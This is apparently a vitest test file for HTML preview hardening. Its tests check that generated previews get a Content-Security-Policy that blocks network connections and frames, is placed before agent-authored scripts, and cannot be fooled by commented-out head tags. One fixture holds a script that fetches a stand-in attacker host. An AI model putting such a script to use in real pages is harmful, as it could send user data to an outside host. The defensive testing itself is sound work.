import { describe, expect, it } from 'vitest';
import { buildPreviewSrcdoc, hardenPreviewDocument } from './html-style-presets';

describe('preview HTML confinement', () => {
  it('blocks every network-capable resource class in generated previews', () => {
    const document = buildPreviewSrcdoc('<script>fetch("https://attacker.test")</script>');
    expect(document).toContain("connect-src 'none'");
    expect(document).toContain('img-src data: blob:');
    expect(document).toContain("frame-src 'none'");
    expect(document).not.toContain('img-src data: blob: https:');
  });

  it('injects the CSP before agent-authored head content', () => {
    const document = hardenPreviewDocument('<html><head><script>void 0</script></head><body>ok</body></html>', {
      allowScripts: true,
    });
    expect(document.indexOf('Content-Security-Policy')).toBeLessThan(document.indexOf('<script>'));
    expect(document).toContain("connect-src 'none'");
    expect(document).toContain("script-src 'unsafe-inline'");
  });

  it('ignores fake head tags inside comments and protects the real head', () => {
    const document = hardenPreviewDocument(
      '<html><!-- <head> --><head><script>void 0</script></head><body>ok</body></html>',
      { allowScripts: true },
    );
    expect(document).toContain('<!-- <head> --><head><meta http-equiv="Content-Security-Policy"');
    expect(document.indexOf('Content-Security-Policy')).toBeLessThan(document.indexOf('<script>'));
  });

  it('disables scripts in standalone blob documents', () => {
    const document = hardenPreviewDocument('<h1>shareable</h1>');
    expect(document).toContain("script-src 'none'");
    expect(document).toContain('<body><h1>shareable</h1></body>');
  });
});
